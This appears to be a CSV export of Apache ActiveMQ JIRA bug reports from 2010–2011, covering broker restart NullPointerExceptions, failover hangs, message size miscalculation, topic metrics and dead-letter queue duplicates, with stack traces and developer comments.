",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQNET-430,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74880,,,Mon Feb 01 23:12:06 UTC 2010,,,,,,,,,,,"0|i0rqfb:",159925,,,,,,,,,,,,,,,,,,,,,"01/Feb/10 22:43;gtully;resolved in r905432
;;;","01/Feb/10 23:12;gtully;on 5.3.1 branch a r905437;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointer in MessageDatabase.java on restarting after ungraceful exit,AMQ-2589,12483185,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,dave_stanley,dave_stanley,01/Feb/10 18:06,01/Feb/10 19:14,14/Jul/23 05:43,01/Feb/10 19:14,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"If I kill -9 the broker when the broker is heavily loaded with transactional consumers I see the following error when I try and restart the broker.


INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:2010/jmxrmi
INFO  BrokerService                  - Using Persistence Adapter: org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter@4f3ba2
ERROR BrokerService                  - Failed to start ActiveMQ JMS Message Broker. Reason: java.lang.NullPointerException
java.lang.NullPointerException
        at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:876)
        at org.apache.activemq.store.kahadb.MessageDatabase.access$700(MessageDatabase.java:82)
        at org.apache.activemq.store.kahadb.MessageDatabase$RemoveOpperation.execute(MessageDatabase.java:1395)
        at org.apache.activemq.store.kahadb.MessageDatabase$16.execute(MessageDatabase.java:800)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:797)
        at org.apache.activemq.store.kahadb.MessageDatabase$11.visit(MessageDatabase.java:710)
        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:692)
        at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:393)
        at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:280)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:321)
        at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:182)
        at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:183)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:456)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:61)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1369)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
INFO  BrokerService                  - ActiveMQ Message Broker (adcmq-INT, null) is shutting down
INFO  TransportConnector             - Connector openwire Stopped
INFO  TransportConnector             - Connector ssl Stopped
INFO  BrokerService                  - ActiveMQ JMS Message Broker (adcmq-INT, null) stopped
ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:98)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        ... 10 more
Caused by: java.lang.NullPointerException
        at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:876)
        at org.apache.activemq.store.kahadb.MessageDatabase.access$700(MessageDatabase.java:82)
        at org.apache.activemq.store.kahadb.MessageDatabase$RemoveOpperation.execute(MessageDatabase.java:1395)
        at org.apache.activemq.store.kahadb.MessageDatabase$16.execute(MessageDatabase.java:800)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:797)
        at org.apache.activemq.store.kahadb.MessageDatabase$11.visit(MessageDatabase.java:710)
        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:692)
        at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:393)
        at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:280)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:321)
        at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:182)
        at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:183)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:456)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:61)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1369)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
        ... 30 more
ERROR: java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:99)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        ... 10 more
Caused by: java.lang.NullPointerException
        at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:876)
        at org.apache.activemq.store.kahadb.MessageDatabase.access$700(MessageDatabase.java:82)
        at org.apache.activemq.store.kahadb.MessageDatabase$RemoveOpperation.execute(MessageDatabase.java:1395)
        at org.apache.activemq.store.kahadb.MessageDatabase$16.execute(MessageDatabase.java:800)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:797)
        at org.apache.activemq.store.kahadb.MessageDatabase$11.visit(MessageDatabase.java:710)
        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:692)
        at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:393)
        at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:280)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:321)
        at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:182)
        at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:183)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:456)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:61)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1369)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
        ... 30 more
",5.3.0.x,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74881,,,Mon Feb 01 19:14:25 UTC 2010,,,,,,,,,,,"0|i0rprz:",159820,,,,,,,,,,,,,,,,,,,,,"01/Feb/10 19:14;gtully;resolved in r905349 on trunk and 5.3.1 branch r905376;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker async disconnect of connections while waiting for slave to connect can lead to hung failover transport,AMQ-2588,12483222,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,29/Jan/10 17:37,29/Jan/10 17:39,14/Jul/23 05:43,29/Jan/10 17:39,5.3.0,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"failover transport can miss an async exception or inactivity timeout exception while in the process of doing a reconnect and can signal reconnection complete in error, leading to a hang.
Some slight changes to AMQ2183Test which demonstrated intermittent hangs made it reliably reproducible and lead to the diagnosis. 
Test scenario is trying to connect to a broker that is waiting for a slave to connect to it. so a pure master slave setup. The failover will eventually hang thinking it has successfully reconnected but has missed an exception.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74882,,,Fri Jan 29 17:39:56 UTC 2010,,,,,,,,,,,"0|i0rql3:",159951,,,,,,,,,,,,,,,,,,,,,"29/Jan/10 17:39;gtully;fixed in r904568;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""queue size "" metrics for topics not accurate",AMQ-2586,12483224,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,chirino,chirino,28/Jan/10 19:58,17/Feb/10 12:16,14/Jul/23 05:43,28/Jan/10 20:02,,,,,,5.3.1,5.4.0,,,,,,0,,,,,,,,,"The queue size metric for topics is currently not accurate.  It is also throwing off the broker total message count metric.  In the queue case this metric is always going up but never comes down.  Since there is no ""queue"" for topics it would be better if this metrics just reported 0.

An alternative solution would be to sum the number of messages in all the subscriptions attached to the topic.",,krm1312,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74883,,,Wed Feb 17 12:16:22 UTC 2010,,,,,,,,,,,"0|i0rpxb:",159844,,,,,,,,,,,,,,,,,,,,,"28/Jan/10 20:02;chirino;Fixed in trunk in rev 904243;;;","17/Feb/10 00:46;krm1312;Would it be possible to backport this small fix to 5.3.1?  We're looking at upgrading from ActiveMQ 4.1 and we have monitoring that checks the broker's TotalMessageCount as an overall health check of the system.  We can check each queue, but the overall check is nice since any substantial backup across queues indicates a potential issue (in our application).;;;","17/Feb/10 12:15;gtully;done. fix applied to 5.3 branch in r910942;;;","17/Feb/10 12:16;gtully;update fixed version to 5.3.1 as fix merge to 5.3 branch;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQTextMessage.getSize() does not consider size of properties,AMQ-2585,12483219,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,magnus.e.persson,magnus.e.persson,28/Jan/10 14:01,29/Jan/10 18:46,14/Jul/23 05:43,29/Jan/10 18:42,5.3.0,,,,,5.4.0,,,JMS client,,,,0,,,,,,,,,"Checking the size of a text message only considers the body of a message, not the properties. I think this relates to a typo in the method:

{noformat}
    public int getSize() {
        if (size == 0 && content == null && text != null) {
            size = getMinimumMessageSize();
            if (marshalledProperties != null) {
                size += marshalledProperties.getLength();
            }
            size = text.length() * 2;
        }
        return super.getSize();
    }
{noformat}

This should perhaps be size += text.length() * 2?",,magnus.e.persson,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jan/10 14:02;magnus.e.persson;ReasonableTextMessageSize.patch;https://issues.apache.org/jira/secure/attachment/12461602/ReasonableTextMessageSize.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74884,,,Fri Jan 29 18:46:08 UTC 2010,,,,,,,Patch Available,,,,"0|i0rqyf:",160011,,,,,,,,,,,,,,,,,,,,,"28/Jan/10 14:02;magnus.e.persson;Test attached;;;","29/Jan/10 18:42;gtully;thanks for the test case. I made some mods as the override of min message size is only relevant to the broker. The size is calculated on demand for consumers.
committed in r904585;;;","29/Jan/10 18:46;gtully;one more thing, just for completeness, the properties were not marshaled by default with the vm transport so they did not appear in the size calculation. adding marshall=true to the vm url ensured they were part of the calculation.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Massege store is not cleaned when durable topic subscribers are refusing messages ,AMQ-2584,12483832,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,durokuruc,durokuruc,27/Jan/10 11:33,23/Aug/11 19:11,14/Jul/23 05:43,27/Oct/10 12:04,5.3.0,5.3.1,5.4.0,,,5.4.2,,,Message Store,,,,0,,,,,,,,,"Hi,

i am using activemq 5.3 (resp. 5.4 snapshot , 5.3.1 snapshot) with kahadb in following use-case:
- 3 durable topic subscriber, each refuses message using session.recover(), 1 delivery attempts
- ActiveMQ.DLQ consumer
- persistent message topic producer

In such case deadletter consumer should consume every message sent, as soon as number of delivery attempts is reached and mmessage is sent to ActiveMQ.DLQ. Result is ok but kahadb data directory at the end contains all log files with names db-<number>.log ever created. They aren't deleted even after some time.

I can also see following massege in console:

WARN | Duplicate message add attempt rejected. Message id: ID:sk1d069c-3826-1264006781626
-0:0:1:1:13425

If use-case is altered to use queue instead of topic log files are periodically deleted without WARN messages in console.

Same behaviour (data files not cleaned) if amqPersistenceAdapter is used except of WARN messages.


","WinXP,
java version ""1.6.0_05""
Java(TM) SE Runtime Environment (build 1.6.0_05-b13)
Java HotSpot(TM) Client VM (build 10.0-b19, mixed mode, sharing)",gtully,larhvi,slewis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jan/10 14:31;durokuruc;2584_test.zip;https://issues.apache.org/jira/secure/attachment/12461601/2584_test.zip","17/Aug/10 14:28;slewis;AMQ2584Test.java;https://issues.apache.org/jira/secure/attachment/12461799/AMQ2584Test.java","16/Aug/10 16:54;gtully;AMQ2584Test.java;https://issues.apache.org/jira/secure/attachment/12461797/AMQ2584Test.java","20/Oct/10 20:25;slewis;UpdatedTestCase.patch;https://issues.apache.org/jira/secure/attachment/12461814/UpdatedTestCase.patch",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14533,,,Tue Aug 23 19:11:38 UTC 2011,,,,,,,,,,,"0|i0b9m7:",63670,,,,,,,,,,,,,,,,,,,,,"27/Jan/10 12:25;gtully;
Could you attach a test case to this?

I have just tracked down the cause of the:
 WARN | Duplicate message add attempt rejected. Message id: ID:sk1d069c-3826-1264006781626-0:0:1:1:13425
but I don't think this could result in dangling references to files in the store. 
So i suspect the there is another reason for the data files not being cleaned up. At simple test case would help a lot.;;;","27/Jan/10 14:31;durokuruc;Find attached java files, sample message and configuration file activemq.xml  for  reproducing this issue.;;;","16/Aug/10 16:54;gtully;junit test case based on submitted test but borrowing from the junit test case attached to https://issues.apache.org/activemq/browse/AMQ-2870

This test case works fine on trunk;;;","16/Aug/10 16:56;gtully;The difference may be the use of a small journal data file length such that the files are quickly reclaimed when the contain unreferenced data. With a large file all the messages can exist in one or two data files.;;;","17/Aug/10 12:18;gtully;Try the new test case, if you can make that fail, please reopen;;;","17/Aug/10 14:28;slewis;Hey Gary, I modified the test case to use multiple consumers, I think that's when this seems to break, what do you think?;;;","17/Aug/10 14:52;gtully;need to look at it in some detail.. guess you should reopen this pending that.;;;","17/Aug/10 14:58;slewis;Yup, sure thing Gary.  Haven't had time to look at it other than updating the test case, but I think it's still an issue.;;;","18/Aug/10 15:24;gtully;got to the bottom of this. Both stores left dangling references to data files when a journal add was suppressed as a duplicate by the index or reference store.
In the AMQ case, the bug was a little subtler as it only occurred if a batched write to the journal was pending when the duplicate occurs.;;;","20/Oct/10 20:25;slewis;Looks like there's still a case this issue can occur, namely if the consumers and DLQ consumer consumes messages concurrently.  Here's a patch that updates the existing test which will then show this other case.;;;","27/Oct/10 12:04;gtully;A workaround for this issue, where the DLQ can receive duplicates, is to disable the cursor message audit for the DLQ.
{code}<policyEntry queue=ActiveMQ.DLQ"" enableAudit=""false"" />{code}

An enhancement, to allow a DLQ per durable subscription would make it possible to track which durable subscription rejected a message on an individual basis:
https://issues.apache.org/activemq/browse/AMQ-3003;;;","28/Oct/10 12:40;gtully;additionally, {code}concurrentStoreAndDispatchQueues=false{code} must be added to the kahaDB persistence adapter to allow it to correctly ack the duplicates that ensue. Otherwise there can be the occasional missed ack. This needs more investigation to see if it can be made work reliably with the default value.;;;","02/Nov/10 13:07;gtully;Final resolution is to suppress duplicate dispatch to the DLQ at source, in the DeadLetterStrategy implementation by having it keep an audit. In this way, only one copy of a message is dispatched to the DLQ, irrespective of how many durable consumers reject the message. AMQ-3003 will help with that.
Most duplicates are trapped by the store, but when the store has already acked the original, it can get through, the potential problem is the pending cursor of messages to dispatch. When concurrent with store, this can result in a missed dispatch and a subsequent missing ack leaving a dangling message.
Suppressing the duplicate send in the deadletter strategy removes this possibility.
Fix in r1030013;;;","09/Jul/11 13:09;larhvi;I'm having a problem where messages fails to enter the DLQ. My scenario is:

1. some message fails during processing and ends up on the DLQ
2. it's moved back to its original queue, but fails again
3. message not sent back to the DLQ

After some googling I found this issue, and I suspect you may have introduced a bug in AbstractDeadLetterStrategy by adding the duplication-checks. (http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/policy/AbstractDeadLetterStrategy.java?r1=1030013&r2=1030012&pathrev=1030013).

I'm seeing the debug log-entry when messages are lost..
2011-07-09 14:59:07,177 | DEBUG | rollback: TX:ID:ubuntu-48335-1310214645889-0:1:18 syncCount: 2 | org.apache.activemq.transaction.LocalTransaction | ActiveMQ Transport: tcp:///127.0.0.1:59188
2011-07-09 14:59:07,178 | DEBUG | Not adding duplicate to DLQ: ID:ubuntu-58129-1310214649907-0:1:9:1:5, dest: queue://xxxx | org.apache.activemq.broker.region.policy.AbstractDeadLetterStrategy | ActiveMQ Transport: tcp:///127.0.0.1:59188
;;;","11/Jul/11 09:13;gtully;Lars, yes, the audit should be configurable, such that is it possible to disable. I will expose the option on the default DLQ strategy.

btw: How do you achieve 2), is it a manual process or do you use a camel route or something else? Any chance you have a test case?

